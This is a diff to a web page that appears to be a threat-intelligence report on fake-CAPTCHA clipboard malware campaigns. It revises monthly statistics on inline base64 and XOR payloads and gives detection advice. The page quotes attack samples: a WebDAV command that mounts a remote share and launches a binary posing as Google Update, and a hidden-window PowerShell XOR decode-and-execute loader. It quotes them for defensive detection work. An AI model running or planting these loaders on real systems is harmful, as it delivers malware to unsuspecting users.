@@ -290,7 +290,7 @@ details[open] > summary { margin-bottom: 0.4rem; }
 </div>
 
 <div class="cg-callout cg-callout--alert">
-  <strong>May 2026: 95.2% of domains now carry inline payloads.</strong> Up from 69% in April and 46% in March, the no-URL rate has hit a new high. Base64 accounts for 69% of May domains (316/458). A new delivery variant also appeared: <code>conhost --headless cmd /c "pushd \\IP@port\DavWWWRoot &amp;&amp; start GoogleUpdate"</code> mounts a WebDAV share and launches a binary impersonating Google Update - no PowerShell, no HTTP fetch, no URL in the clipboard command at all. Your T1105 network-fetch detection never fires. The behavioral chokepoint that does fire: unusual parent process spawning <code>conhost.exe</code> or <code>cmd.exe</code> with a UNC path argument.
+  <strong>May 2026: 92.4% of domains now carry inline payloads.</strong> Up from 65% in April and 40% in March, the no-URL rate has hit a new high. Base64 accounts for 67% of May domains (354/528). A new delivery variant also appeared: <code>conhost --headless cmd /c "pushd \\IP@port\DavWWWRoot &amp;&amp; start GoogleUpdate"</code> mounts a WebDAV share and launches a binary impersonating Google Update - no PowerShell, no HTTP fetch, no URL in the clipboard command at all. Your T1105 network-fetch detection never fires. The behavioral chokepoint that does fire: unusual parent process spawning <code>conhost.exe</code> or <code>cmd.exe</code> with a UNC path argument.
 </div>
 
 <!-- ── Chart B: Cradle Family Evolution ──────────────────────────────── -->
@@ -328,7 +328,7 @@ details[open] > summary { margin-bottom: 0.4rem; }
 </div>
 
 <div class="cg-callout cg-callout--warn">
-  <strong>Different domains encode differently; the dominant encoder shifted in May.</strong> Through April the inline encoder was hex-XOR (<code>-bxor</code>): 16% of March domains, <strong>54% in April</strong> (97/181). In May base64 jumped to <strong>69%</strong> (316/458) as the domain count nearly tripled, while hex-XOR kept growing in absolute terms (65 → 97 → 105) and fell only as a share (23%). The two sets barely overlap (2 of May's 316 base64 domains also use hex-XOR), and the base64 jump is almost entirely one token (<code>frombase64string</code>, 314 of 316), which reads more like a single campaign cluster than a broad re-tooling. Either way, if your rules match plaintext <code>iwr https://</code> strings you're seeing the encoded version now, not the decoded cradle. Detect the encoding act, not the encoder: <code>[Convert]::FromBase64String</code> piped to <code>iex</code>, the <code>-bxor</code> decode loop, or <code>-enc</code> from an unusual parent. The content is opaque; the execution context isn't.
+  <strong>The May base64 spike was one campaign, not a re-tooling.</strong> Hex-XOR (<code>-bxor</code>) is the persistent inline encoder of spring 2026: absent before March, then 16% of March domains, <strong>54% in April</strong> (97/181), 22% in May, and back to <strong>84% in June</strong> (62/74). Base64 stayed in the single digits (9% March, 8% April) until May, when it spiked to <strong>67%</strong> (354/528) almost entirely on one token (<code>frombase64string</code>, 352 of 354) before collapsing to 1% in June. The two encoders barely overlap (2 of May's 354 base64 domains also use hex-XOR), so this reads as a single base64 campaign cluster passing through, not a durable shift. Either way, if your rules match plaintext <code>iwr https://</code> strings you're seeing the encoded version now, not the decoded cradle. Detect the encoding act, not the encoder: <code>[Convert]::FromBase64String</code> piped to <code>iex</code>, the <code>-bxor</code> decode loop, or <code>-enc</code> from an unusual parent. The content is opaque; the execution context isn't.
 </div>
 
 <div class="cg-callout cg-callout--warn">
@@ -352,19 +352,19 @@ details[open] > summary { margin-bottom: 0.4rem; }
 
 <!-- ── Inline Payloads ─────────────────────────────────────────── -->
 <h2 id="inline">Strategic Shift: Inline Payloads Bypassing Network Fetch Detection</h2>
-<p>Here's the finding that changes the detection calculus: <strong>95% of May 2026 domains have no URL in the clipboard command at all.</strong> Up from 28% in August. The payload is entirely inline. The user pastes everything needed, and nothing reaches out to a staging server. Your network-fetch detection? It never fires.</p>
+<p>Here's the finding that changes the detection calculus: <strong>92% of May 2026 domains have no URL in the clipboard command at all.</strong> Up from 28% in August. The payload is entirely inline. The user pastes everything needed, and nothing reaches out to a staging server. Your network-fetch detection? It never fires.</p>
 
-<p>Base64 now accounts for 69% of May domains (316/458) - it's not one technique among several, it's the dominant inline encoder. Two other techniques appear in smaller numbers: <strong>hex XOR</strong> (<code>$k/$d</code> variable patterns with <code>-bxor</code> decoding, 65 instances in March), and a newer <strong>WebDAV delivery</strong> variant using <code>conhost --headless cmd /c "pushd \\IP@port\DavWWWRoot &amp;&amp; start GoogleUpdate"</code> - no PowerShell, no HTTP, nothing to intercept at the network layer. The social engineering does double duty. Fake CAPTCHA comments inside the payload reinforce the lure:</p>
+<p>Base64 accounted for 67% of May domains (354/528), but that was a single-campaign spike (see above) - by June it collapsed to 1% while <strong>hex XOR</strong> (<code>$k/$d</code> variable patterns with <code>-bxor</code> decoding, 65 instances in March) climbed back to 84%. A newer <strong>WebDAV delivery</strong> variant also appears, using <code>conhost --headless cmd /c "pushd \\IP@port\DavWWWRoot &amp;&amp; start GoogleUpdate"</code> - no PowerShell, no HTTP, nothing to intercept at the network layer. The social engineering does double duty. Fake CAPTCHA comments inside the payload reinforce the lure:</p>
 
 <pre class="logic-block rounded-lg p-4 overflow-x-auto text-[.8rem]"><code>powershell -w hidden &lt;# I am not a robot - Cloudflare ID: 8e3f2a #&gt; $k='xK9mP2';$d='4a5b6c...';
 $b=[byte[]]@();for($i=0;$i-lt$d.Length;$i+=2){$b+=[byte]("0x"+$d.Substring($i,2))-bxor[byte]$k[$i%$k.Length]};
 iex([Text.Encoding]::UTF8.GetString($b))</code></pre>
 
 <div class="cg-callout cg-callout--alert">
-  <strong>Your network-fetch detection covers 5% of the threat now.</strong> 95% of May 2026 domains skip the remote fetch entirely. You need a parallel detection for the decode-and-execute pattern: unusual parent → PowerShell with <code>-enc</code>, <code>-bxor</code> operations, or <code>[Convert]::FromBase64String</code> piped to <code>iex</code>. Neither detection alone is sufficient anymore. Run both. And if you're not alerting on <code>conhost --headless</code> spawning <code>cmd.exe</code> with a UNC path argument, you have a blind spot for the WebDAV variant entirely.
+  <strong>Your network-fetch detection covers 8% of the threat now.</strong> 92% of May 2026 domains skip the remote fetch entirely. You need a parallel detection for the decode-and-execute pattern: unusual parent → PowerShell with <code>-enc</code>, <code>-bxor</code> operations, or <code>[Convert]::FromBase64String</code> piped to <code>iex</code>. Neither detection alone is sufficient anymore. Run both. And if you're not alerting on <code>conhost --headless</code> spawning <code>cmd.exe</code> with a UNC path argument, you have a blind spot for the WebDAV variant entirely.
 </div>
 
-<p>Monthly no-URL trend: Aug 28% → Sep 32% → Oct 32% → Nov 6% → Dec 19% → Jan 44% → Feb 30% → Mar 46% → Apr 69% → <strong>May 95%</strong>.</p>
+<p>Monthly no-URL trend: Aug 28% → Sep 29% → Oct 32% → Nov 5% → Dec 7% → Jan 16% → Feb 6% → Mar 40% → Apr 65% → May 92% → <strong>Jun 88%</strong>.</p>
 
 <h3>Port 5506 C2 Infrastructure Cluster</h3>
 <p>333 domains call back to port 5506 across 14 IPs in a few /24 ranges. One operator, one port, zero legitimate services using 5506. This is the kind of infrastructure fingerprint that makes network detection easy.</p>
@@ -612,7 +612,7 @@ level: high
     <span class="det-rec-tier tier-2">T1027</span>
     <div>
       <div class="det-rec-title">Detect Base64 decode + execute</div>
-      <div class="det-rec-desc"><code>[Convert]::FromBase64String</code> or <code>[Text.Encoding]::UTF8.GetString</code> followed immediately by <code>iex</code> / <code>Invoke-Expression</code>. The encoding act itself is detectable even when the decoded content is not. Base64 jumped from 6.1% of domains in April 2026 to 69% in May 2026 (316/458).</div>
+      <div class="det-rec-desc"><code>[Convert]::FromBase64String</code> or <code>[Text.Encoding]::UTF8.GetString</code> followed immediately by <code>iex</code> / <code>Invoke-Expression</code>. The encoding act itself is detectable even when the decoded content is not. Base64 jumped from 8.3% of domains in April 2026 to 67% in May 2026 (354/528) before receding in June.</div>
     </div>
   </div>
   {% if site.data.clickgrab_trends.payload_examples.base64.size > 0 %}
@@ -743,7 +743,7 @@ level: high</code></pre>
     <span class="det-rec-tier tier-2">T1218</span>
     <div>
       <div class="det-rec-title">Detect MSIExec fetching packages from non-enterprise URLs</div>
-      <div class="det-rec-desc"><code>msiexec.exe</code> with <code>/i http</code> where the URL is not a known enterprise software source, spawned from <code>cmd.exe</code> or <code>explorer.exe</code> (Run dialog). Covers the 1,052-domain MSIExec delivery campaign that peaked at 87% in Nov 2025.</div>
+      <div class="det-rec-desc"><code>msiexec.exe</code> with <code>/i http</code> where the URL is not a known enterprise software source, spawned from <code>cmd.exe</code> or <code>explorer.exe</code> (Run dialog). Covers the 1,054-domain MSIExec delivery campaign that peaked at 87% in Nov 2025.</div>
     </div>
   </div>
   <details>
@@ -788,7 +788,7 @@ level: high</code></pre>
     <span class="det-rec-tier tier-1">T1059</span>
     <div>
       <div class="det-rec-title">Detect inline payload decode-and-execute</div>
-      <div class="det-rec-desc">PowerShell with <code>-enc</code> flag or XOR decode operations (<code>-bxor</code>, <code>[byte]</code>, <code>[char]</code>) spawned from unusual parent (Run dialog chain). Also: <code>[Convert]::FromBase64String</code> followed by <code>iex</code>. Covers the 28% → 95% growth in inline payloads that skip the network fetch entirely. <strong>Run alongside network-fetch detection. Both are needed for full coverage.</strong></div>
+      <div class="det-rec-desc">PowerShell with <code>-enc</code> flag or XOR decode operations (<code>-bxor</code>, <code>[byte]</code>, <code>[char]</code>) spawned from unusual parent (Run dialog chain). Also: <code>[Convert]::FromBase64String</code> followed by <code>iex</code>. Covers the 28% → 92% growth in inline payloads that skip the network fetch entirely. <strong>Run alongside network-fetch detection. Both are needed for full coverage.</strong></div>
     </div>
   </div>
   <details>
